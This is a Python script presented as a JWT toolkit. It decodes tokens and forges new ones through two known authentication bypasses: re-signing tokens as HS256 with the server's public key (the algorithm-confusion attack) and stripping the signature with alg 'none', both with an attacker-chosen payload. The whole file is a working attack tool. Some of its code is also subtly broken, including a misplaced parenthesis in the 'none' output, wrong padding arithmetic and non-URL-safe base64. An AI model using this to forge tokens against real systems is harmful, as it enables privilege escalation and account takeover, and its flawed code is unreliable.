#!/usr/bin/python3
import sys
import os
import binascii
import hashlib
import hmac
import subprocess
import base64 
import argparse
import json

def HS256(args):
    jwt_ = args.JsonWebToken
    pubKeyLocation = args.PublicKey
    tokenList = splittoken(jwt_)
    print("*"*50)
    print("New JWT header is:")
    print("*"*50)
    newHeader = newheader()
    print(newHeader)
    print("*"*50)
    if args.payload:
        print("New JWT payload is:")
        print("*"*50)
        tokenList[1] = newpayload(args.payload)
        print(tokenList[1])
        print("*"*50)
    print("New JWT secret is:")
    print("*"*50)
    key = hexPubKey(pubKeyLocation)
    data = newHeader+'.'+tokenList[1]
    secret = getNewSecret(data, key)
    print(secret)
    print("*"*50)
    print("New JWT Token is:")
    print("*"*50)
    print(f'{data}.{secret}')

def DECODE(args):
    jwt_ = args.JsonWebToken
    # Split token into separate parts
    tokenList = splittoken(jwt_)
    layout = {
        0:'Header',
        1:'Payload',
        2:'Secret'
    }
    # Iterate over the token segments
    for token in tokenList:
        i = tokenList.index(token)
        print("*"*50)
        print(f"The JWT {layout[i]} is:")
        if i != 2:
            print(decodetoken(token))
        else:
            print("Secret")
        print("*"*50)

def NONEALG(args):
    jwt_ = args.JsonWebToken
    # Split token into separate parts
    tokenList = splittoken(jwt_)
    # Create none type header
    new_header = base64.b64encode('{"typ":"JWT","alg":"none"}'.encode('ascii'))
    if args.payload:
        tokenList[1] = newpayload(args.payload)
    # Return the base64 string stripping any padding
    print(new_header.decode('ascii').replace('=','')+'.'+tokenList[1])+'.'

def splittoken(token):
    # Split token into separate parts
    tokenList = token.split('.')
    return tokenList

def decodetoken(token):
    # Check token to see if any padding is needed
    paddingReq = len(token) % 4
    if paddingReq: 
        # Add padding if required
        token = token+'='*paddingReq
    # Return decoded token
    return base64.b64decode(token.encode('ascii')).decode('latin-1')

def newheader():
    # Create new header setting type to HS256 to abuse public key
    # Byte encode the header and base64 encode it
    new_header = base64.b64encode('{"typ":"JWT","alg":"HS256"}'.encode('ascii'))
    # Return the base64 string stripping any padding
    return new_header.decode('ascii').replace('=','')

def newpayload(payload):
    # Create new payload from JSON string if set
    # Convert Dict to bytes
    byte_payload = json.dumps(payload).encode('utf-8')
    # Base64 encode the byte encoded Dict
    new_payload = base64.b64encode(byte_payload)
    # Return the base64 string stripping any padding
    return new_payload.decode('ascii').replace('=','')

def hexPubKey(publicKeyLoc):
    newKey_ = b""
    # Open public key file 
    with open(publicKeyLoc, 'rb') as f: 
        # Read 32 Bytes of the file as a bytes
        for chunk in iter(lambda: f.read(32), b''):
            # Convert the hex to a byte string 
            newKey_ += binascii.hexlify(chunk)
    # Return the key has a string
    return newKey_.decode('ascii')

def getNewSecret(data, key):
    # Conver the string to binary data 
    byte_key = binascii.unhexlify(key)
    # Encode the string data
    data = data.encode()
    # Create a digest of the data using the SHA256 algorithm and the key
    hash = hmac.new(byte_key, data, hashlib.sha256).digest()
    # Return the base64 string stripping any padding
    newSecret = base64.b64encode(hash).strip().decode('ascii').replace('=','')
    return newSecret



def main():
    # Parse arguments from CLI
    parser = argparse.ArgumentParser(description='The JWT toolkit')
    subparsers = parser.add_subparsers()

    # Parse arguments for HS256 function
    parser_hs256 = subparsers.add_parser('hs256', help="Converts algorithm type to HS256")
    parser_hs256.add_argument('JsonWebToken', type=str, help='The full JWT that will be modified')
    parser_hs256.add_argument('PublicKey', type=str, help='The public key used to sign the JWT')
    parser_hs256.add_argument('-p', '--payload', type=json.loads, help='The JSON payload to replace in the JWT')
    parser_hs256.set_defaults(func=HS256)

    # Parse arguments for Decode function
    parser_decode = subparsers.add_parser('decode', help="Decode the JWT into its plain text components")
    parser_decode.add_argument('JsonWebToken', type=str, help='The full JWT that will be decoded')
    parser_decode.set_defaults(func=DECODE)

    # Parse arguments for Decode function
    parser_none = subparsers.add_parser('none', help="Converts algorithm type to none")
    parser_none.add_argument('JsonWebToken', type=str, help='The full JWT that will be decoded')
    parser_none.add_argument('-p', '--payload', type=json.loads, help='The JSON payload to replace in the JWT')
    parser_none.set_defaults(func=NONEALG)

    args = parser.parse_args()
    try:
        args.func(args)
    except Exception as e:
        parser.parse_args('-h')

if __name__ == "__main__":
    main()